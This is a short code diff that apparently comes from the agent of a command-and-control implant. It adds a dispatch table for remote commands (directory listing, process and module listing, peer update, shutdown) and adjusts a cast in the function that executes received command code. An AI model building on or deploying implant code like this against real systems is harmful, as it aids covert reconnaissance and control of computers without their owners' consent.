@@ -223,6 +223,15 @@ namespace Message {
     defer:
     }
 
+    RDATA_SECTION COMMAND_MAP CmdMap[] = {
+        {.Id = CommandDir,          .Function = Commands::DirectoryList},
+        {.Id = CommandMods,         .Function = Commands::ProcessModules},
+        {.Id = CommandProcess,      .Function = Commands::ProcessList},
+        {.Id = CommandUpdatePeer,   .Function = Commands::UpdatePeer},
+        {.Id = CommandShutdown,     .Function = Commands::Shutdown},
+        {.Id = 0,                   .Function = nullptr}
+    };
+
     VOID CommandDispatch (PSTREAM Inbound) {
         HEXANE
 
@@ -277,7 +286,7 @@ namespace Message {
                     return_defer(ntstatus);
                 }
 
-                auto (*Cmd)(PPARSER) = S_CAST(VOID (*)(PPARSER), Exec);
+                auto (*Cmd)(PPARSER) = R_CAST(VOID (*)(PPARSER), Exec);
                 Cmd(&Parser);
 
                 x_memset(Exec, 0, Size);
